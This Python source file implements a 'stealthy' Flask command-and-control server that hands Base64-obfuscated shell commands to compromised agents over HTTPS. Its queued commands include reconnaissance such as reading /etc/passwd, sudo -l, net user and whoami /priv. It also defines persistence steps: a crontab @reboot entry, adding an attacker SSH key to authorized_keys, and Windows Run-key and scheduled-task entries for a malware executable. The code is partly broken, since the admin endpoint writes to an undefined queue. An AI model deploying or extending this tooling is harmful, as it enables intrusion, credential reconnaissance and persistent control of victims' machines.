#!/usr/bin/env python3
"""
Enhanced Stealthy C2 Server using Python and Flask
----------------------------------------------------
Features:
- Runs as an HTTPS server on port 443.
- Maintains a dynamic command queue for each agent.
- Provides an admin endpoint to add commands to an agent's queue.
- Encodes commands with Base64 (and potentially further encrypts them).
- Logs check-ins, command dispatch, and execution metrics.
"""

import base64
import logging
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

# Set up logging to console with timestamps
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

# Dictionary mapping agent IDs to a list (queue) of commands.
# Each command is a dictionary with details such as type, payload, and timestamp.
import time

recon_commands = {
    "agent1": [
        { "cmd": "echo 'Hello from C2!'", "type": "shell", "timestamp": time.time() },
        { "cmd": "whoami", "type": "shell", "timestamp": time.time() },
        { "cmd": "uname -a", "type": "shell", "timestamp": time.time() },
        { "cmd": "ifconfig || ip a", "type": "shell", "timestamp": time.time() },
        { "cmd": "netstat -antup", "type": "shell", "timestamp": time.time() },
        { "cmd": "cat /etc/passwd", "type": "shell", "timestamp": time.time() },
        { "cmd": "sudo -l", "type": "shell", "timestamp": time.time() },
    ],
    "windows": [        
        # Windows equivalents
        { "cmd": "whoami", "type": "shell", "timestamp": time.time() },
        { "cmd": "systeminfo", "type": "shell", "timestamp": time.time() },
        { "cmd": "ipconfig /all", "type": "shell", "timestamp": time.time() },
        { "cmd": "netstat -ano", "type": "shell", "timestamp": time.time() },
        { "cmd": "type C:\\Windows\\System32\\drivers\\etc\\hosts", "type": "shell", "timestamp": time.time() },
        { "cmd": "net user", "type": "shell", "timestamp": time.time() },
        { "cmd": "whoami /priv", "type": "shell", "timestamp": time.time() },
    ],
}

# Persistence Techniques
persistence_commands = {
    "linux": [
        { "cmd": "(crontab -l ; echo \"@reboot /tmp/malware\") | crontab -", "type": "persistence", "timestamp": time.time() },
        { "cmd": "echo \"ssh-rsa ATTACKER_PUB_KEY\" >> ~/.ssh/authorized_keys", "type": "persistence", "timestamp": time.time() },
    ],
    "windows": [
        { "cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\malware.exe\"", "type": "persistence", "timestamp": time.time() },
        { "cmd": "schtasks /create /tn \"Cleanup\" /tr \"C:\\malware.exe\" /sc hourly /mo 1", "type": "persistence", "timestamp": time.time() },
    ],
}


# Dictionary to log metrics for each agent (e.g., last check-in time, response times).
agent_metrics = {}

@app.route('/c2', methods=['POST'])
def c2_endpoint():
    """
    Primary endpoint for agent check-ins.
    Agents send a JSON payload with their "id". The server responds with the next command (if any).
    """
    try:
        data = request.get_json(force=True)
        agent_id = data.get("id")
        if not agent_id:
            logging.warning("Received check-in without agent ID.")
            return jsonify({"error": "Missing agent ID"}), 400

        # Record the check-in time for metrics.
        checkin_time = time.time()
        agent_metrics.setdefault(agent_id, {})['last_checkin'] = checkin_time
        logging.info(f"Agent {agent_id} checked in at {checkin_time:.2f}")

        # Get the next command from the agent's command queue.
        if recon_commands.get(agent_id) and len(recon_commands[agent_id]) > 0:
            command_data = recon_commands[agent_id].pop(0)
            command_text = command_data.get("cmd")
        else:
            # Default command if no pending commands.
            command_text = "NOP"

        # Encode the command using URL-safe Base64 encoding.
        encoded_command = base64.urlsafe_b64encode(command_text.encode()).decode()
        response = {
            "agent_id": agent_id,
            "status": "active",
            "timestamp": checkin_time,
            "cmd": encoded_command  # The command is delivered in an obfuscated format.
        }
        
        logging.info(f"Dispatched command to agent {agent_id}: {command_text}")
        return jsonify(response), 200

    except Exception as e:
        logging.error(f"Error processing agent check-in: {e}")
        return jsonify({"error": "Invalid request format"}), 400

@app.route('/admin/add_command', methods=['POST'])
def add_command():
    """
    Admin endpoint to add a new command to an agent's queue.
    Expects a JSON payload with "agent_id", "cmd", and optionally "type" (default: "shell").
    """
    try:
        data = request.get_json(force=True)
        agent_id = data.get("agent_id")
        cmd = data.get("cmd")
        cmd_type = data.get("type", "shell")

        if not agent_id or not cmd:
            return jsonify({"error": "Missing agent_id or cmd"}), 400

        # Append the command with the current timestamp.
        command_entry = {
            "cmd": cmd,
            "type": cmd_type,
            "timestamp": time.time()
        }
        agent_commands.setdefault(agent_id, []).append(command_entry)
        logging.info(f"Admin added command for agent {agent_id}: {cmd}")
        return jsonify({"message": "Command added successfully"}), 200

    except Exception as e:
        logging.error(f"Error adding command: {e}")
        return jsonify({"error": "Invalid request format"}), 400

if __name__ == '__main__':
    # For production, use valid TLS certificates.
    tls_context = ('cert.pem', 'key.pem')
    app.run(host='0.0.0.0', port=443, ssl_context=tls_context)
